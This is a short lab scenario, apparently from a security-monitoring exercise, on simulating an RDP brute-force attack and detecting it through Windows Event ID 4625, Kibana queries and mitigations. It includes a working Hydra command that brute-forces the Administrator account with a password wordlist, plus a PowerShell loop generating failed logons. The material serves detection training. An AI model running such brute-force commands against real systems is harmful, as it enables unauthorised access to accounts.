# 🛡️ Scenario 2: Lateral Movement via RDP Brute Force

## 🎯 Objective

Simulate and detect Remote Desktop Protocol (RDP) brute-force attacks using stolen credentials.

---

## 🧪 Attack Simulation

### ✅ Method 1: Hydra from Kali

```bash
hydra -t 4 -V -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<Windows_VM_IP>
```

### ✅ Method 2: Windows PowerShell Loop

```powershell
for ($i = 0; $i -lt 5; $i++) {
    cmdkey /add:127.0.0.1 /user:fakeuser /pass:wrongpass
    mstsc /v:127.0.0.1
}
```

---

## 📊 Detection

### 🧠 Key Event IDs

| Event ID | Description              |
|----------|---------------------------|
| 4625     | Failed logon attempt     |


---

## 🔍 Kibana Queries

```kql
winlog.event_id:4625 
winlog.event_data.TargetUserName:"Administrator"
```


## 🛡️ Mitigation

- Restrict RDP to known IPs.
- Enable MFA and account lockout.
- Monitor for 4625 spikes.
